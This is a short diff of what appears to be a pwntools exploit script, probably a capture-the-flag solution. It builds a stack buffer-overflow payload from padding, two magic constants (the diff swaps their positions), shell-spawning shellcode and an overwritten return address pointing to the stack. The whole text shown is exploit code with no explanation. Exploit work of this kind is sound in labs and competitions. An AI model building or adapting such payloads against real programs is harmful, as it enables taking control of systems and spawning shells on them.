@@ -12,7 +12,7 @@ shellcode = asm(shellcraft.sh())
 
 payload  = b''
 payload += (0x128 - 0xc) * b'A'
-payload += p32(0xdeadd00d)
+payload += p32(0xb16b00b5)
 payload += (0x11c - (stack + len(payload)) & 0xf) * b'B'
 
 stack += len(payload)
@@ -20,7 +20,7 @@ log.info('stack: ' + hex(stack))
 
 payload += shellcode
 payload += (0x128 - len(payload) + 0xb7) * b'C'
-payload += p32(0xb16b00b5)
+payload += p32(0xdeadd00d)
 payload += (0x128 - len(payload)) * b'D'
 payload += p64(stack)
 
